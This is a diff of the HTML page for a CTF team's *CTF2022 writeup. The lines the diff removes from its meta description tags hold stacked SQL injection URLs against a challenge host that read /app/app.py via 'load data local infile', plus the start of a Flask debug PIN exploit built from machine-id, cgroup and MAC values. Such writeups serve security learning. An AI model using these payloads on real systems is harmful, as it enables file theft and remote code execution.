@@ -1,32 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Web oh-my-notepro debug 模式为开，随便试一试即可触发报错，note_id 处存在注入，使用 load data local infile &#39;xx&#39; into table xx 可以读文件。
-创建临时表：
-http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;create table otable(data varchar(10000));--&#43; 把文件写入表中：
-http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;load data local infile &amp;#34;/app/app.py&amp;#34; into table otable;--&#43; 读取数据：
-http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,(select group_concat(data, &amp;#39;\n&amp;#39;) from (select data from otable limit 0,50)x),5;--&#43; debug模式为开，考虑计算flask debug pin，exp如下：
-import hashlib from itertools import chain def get_machine_id(): machine_id = &amp;#39;1cc402dd0e11d5ae18db04a6de87223d&amp;#39; # /etc/machine-id  boot_id = &amp;#39;&amp;#39; # /proc/sys/kernel/random/boot_id  cgroup = &amp;#39;4b13f9ab9776ea7cf70e6ab9b3a06f5987e0d7b73fe5703ecf8e1d06018ebc71&amp;#39; # /proc/1/cgroup  linux = machine_id &#43; boot_id &#43; cgroup return linux rv = None num = None mac = &amp;#39;02:42:ac:1c:00:03&amp;#39;# /sys/class/net/eth0/address  probably_public_bits = [ &amp;#39;ctf&amp;#39;,# username  &amp;#39;flask.'><title></title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='*CTF2022 11th'><title>SCTF2021 Writeup by or4nge</title>
 
 <link rel='canonical' href='https://or4ngesec.github.io/post/starctf2022-writeup-by-or4nge/'>
 
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content=''>
-<meta property='og:description' content='Web oh-my-notepro debug 模式为开，随便试一试即可触发报错，note_id 处存在注入，使用 load data local infile &#39;xx&#39; into table xx 可以读文件。
-创建临时表：
-http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;create table otable(data varchar(10000));--&#43; 把文件写入表中：
-http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;load data local infile &amp;#34;/app/app.py&amp;#34; into table otable;--&#43; 读取数据：
-http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,(select group_concat(data, &amp;#39;\n&amp;#39;) from (select data from otable limit 0,50)x),5;--&#43; debug模式为开，考虑计算flask debug pin，exp如下：
-import hashlib from itertools import chain def get_machine_id(): machine_id = &amp;#39;1cc402dd0e11d5ae18db04a6de87223d&amp;#39; # /etc/machine-id  boot_id = &amp;#39;&amp;#39; # /proc/sys/kernel/random/boot_id  cgroup = &amp;#39;4b13f9ab9776ea7cf70e6ab9b3a06f5987e0d7b73fe5703ecf8e1d06018ebc71&amp;#39; # /proc/1/cgroup  linux = machine_id &#43; boot_id &#43; cgroup return linux rv = None num = None mac = &amp;#39;02:42:ac:1c:00:03&amp;#39;# /sys/class/net/eth0/address  probably_public_bits = [ &amp;#39;ctf&amp;#39;,# username  &amp;#39;flask.'>
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='SCTF2021 Writeup by or4nge'>
+<meta property='og:description' content='*CTF2022 11th'>
 <meta property='og:url' content='https://or4ngesec.github.io/post/starctf2022-writeup-by-or4nge/'>
 <meta property='og:site_name' content='or4nge'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' />
-<meta name="twitter:title" content="">
-<meta name="twitter:description" content="Web oh-my-notepro debug 模式为开，随便试一试即可触发报错，note_id 处存在注入，使用 load data local infile &#39;xx&#39; into table xx 可以读文件。
-创建临时表：
-http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;create table otable(data varchar(10000));--&#43; 把文件写入表中：
-http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;load data local infile &amp;#34;/app/app.py&amp;#34; into table otable;--&#43; 读取数据：
-http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,(select group_concat(data, &amp;#39;\n&amp;#39;) from (select data from otable limit 0,50)x),5;--&#43; debug模式为开，考虑计算flask debug pin，exp如下：
-import hashlib from itertools import chain def get_machine_id(): machine_id = &amp;#39;1cc402dd0e11d5ae18db04a6de87223d&amp;#39; # /etc/machine-id  boot_id = &amp;#39;&amp;#39; # /proc/sys/kernel/random/boot_id  cgroup = &amp;#39;4b13f9ab9776ea7cf70e6ab9b3a06f5987e0d7b73fe5703ecf8e1d06018ebc71&amp;#39; # /proc/1/cgroup  linux = machine_id &#43; boot_id &#43; cgroup return linux rv = None num = None mac = &amp;#39;02:42:ac:1c:00:03&amp;#39;# /sys/class/net/eth0/address  probably_public_bits = [ &amp;#39;ctf&amp;#39;,# username  &amp;#39;flask.">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Writeup' /><meta property='article:tag' content='starCTF' /><meta property='article:tag' content='XCTF' /><meta property='article:published_time' content='2022-04-18T15:03:17&#43;08:00'/><meta property='article:modified_time' content='2022-04-18T15:03:17&#43;08:00'/><meta property='og:image' content='https://or4ngesec.github.io/post/starctf2022-writeup-by-or4nge/cover.png' />
+<meta name="twitter:title" content="SCTF2021 Writeup by or4nge">
+<meta name="twitter:description" content="*CTF2022 11th"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://or4ngesec.github.io/post/starctf2022-writeup-by-or4nge/cover.png' />
     </head>
     <body class="
     article-page has-toc
@@ -73,20 +59,57 @@ import hashlib from itertools import chain def get_machine_id(): machine_id = &a
         </div>
     
 <main class="main full-width">
-    <article class="main-article">
+    <article class="has-image main-article">
     <header class="article-header">
+        <div class="article-image">
+            <a href="/post/starctf2022-writeup-by-or4nge/">
+                <img src="/post/starctf2022-writeup-by-or4nge/cover_hu1b2e905ab849912933a39ffac9637886_354329_800x0_resize_box_3.png"
+                        srcset="/post/starctf2022-writeup-by-or4nge/cover_hu1b2e905ab849912933a39ffac9637886_354329_800x0_resize_box_3.png 800w, /post/starctf2022-writeup-by-or4nge/cover_hu1b2e905ab849912933a39ffac9637886_354329_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="325" 
+                        loading="lazy"
+                        alt="Featured image of post SCTF2021 Writeup by or4nge" />
+                
+            </a>
+        </div>
+    
 
     <div class="article-details">
     
+    <header class="article-category">
+        
+            <a href="/categories/writeup/" >
+                Writeup
+            </a>
+        
+    </header>
+    
 
     <h2 class="article-title">
-        <a href="/post/starctf2022-writeup-by-or4nge/"></a>
+        <a href="/post/starctf2022-writeup-by-or4nge/">SCTF2021 Writeup by or4nge</a>
     </h2>
 
+    
+    <h3 class="article-subtitle">
+        *CTF2022 11th
+    </h3>
     
 
     
     <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 18, 2022</time>
+            </div>
         
 
         
@@ -887,15 +910,155 @@ participant_number <span style="color:#f92672">=</span> <span style="color:#ae81
 
     <footer class="article-footer">
     
+    <section class="article-tags">
+        
+            <a href="/tags/writeup/">Writeup</a>
+        
+            <a href="/tags/starctf/">starCTF</a>
+        
+            <a href="/tags/xctf/">XCTF</a>
+        
+    </section>
+
 
     </footer>
 
 
     
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
 </article>
 
     <aside class="related-contents--wrapper">
     
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/post/sctf2021-writeup-by-or4nge/">
+        
+        
+            <div class="article-image">
+                <img src="/post/sctf2021-writeup-by-or4nge/cover.6ca02a7e0f493e356da43aef89bb74bf_hu20e70d2f1ec0ceae4e2274ecf0db6e8c_615875_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-bKAqfg9JPjVtpDrvibt0vw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SCTF2021 Writeup by or4nge</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/hgame2022-writeup-by-or4nge/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HGAME2022 Writeup by or4nge</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/hws2022-writeup/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hws2022-writeup/cover.f811fdb681235510573ab73e97dd00ae_hu31039705144761defd1e1848d4287a81_131160_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-&#43;BH9toEjVRBXOrc&#43;l90Arg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HWS2022冬令营预选赛 Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/cazy-writeup-by-or4nge/">
+        
+        
+            <div class="article-image">
+                <img src="/post/cazy-writeup-by-or4nge/cover.b7dbd864c0b986f185463e4e1e361913_hu2ef483a7301ed58558e75f3e1747bee2_206467_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-t9vYZMC5hvGFRj5OHjYZEw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">长安战“疫” Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/kctf2021-fall-writeup-by-or4nge/">
+        
+        
+            <div class="article-image">
+                <img src="/post/kctf2021-fall-writeup-by-or4nge/cover.d3f800bd94671a07795ef31abe675705_hufd6827b5e92508a15177056d76ff05d4_2462797_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-0/gAvZRnGgd5XvMavmdXBQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">KCTF2021 Fall Writeup by or4nge</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
     
 </aside>
 
